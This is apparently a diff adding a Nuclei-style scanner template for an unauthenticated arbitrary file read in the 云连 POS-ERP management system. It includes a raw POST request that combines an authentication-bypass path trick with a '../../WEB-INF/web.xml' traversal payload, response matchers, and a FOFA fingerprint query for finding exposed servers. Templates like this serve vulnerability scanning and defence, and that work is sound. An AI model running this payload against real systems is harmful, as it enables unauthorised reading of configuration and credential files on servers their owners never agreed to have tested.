@@ -1,0 +1,38 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <?xml version=
+            - <web-app
+            - </web-app>
+            - <context-param>
+            - </context-param>
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /admin/file!download.action;admin!login.action HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+          Accept-Encoding: gzip, deflate
+          Accept-Language: zh-CN,zh;q=0.9
+          Content-Type: application/x-www-form-urlencoded
+          Connection: close
+
+          downloadFile=../../WEB-INF/web.xml
+id: yunlianPOS-ERP-download_action-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/jsoa/login.jsp"
+        云连POS-ERP管理系统 download.action 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+    name: 云连POS-ERP管理系统 download.action 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/gcGFam_U-9h8HY64xVmi8w?token=1383368913&lang=zh_CN
+    severity: high
+    tags:
+        - File reading
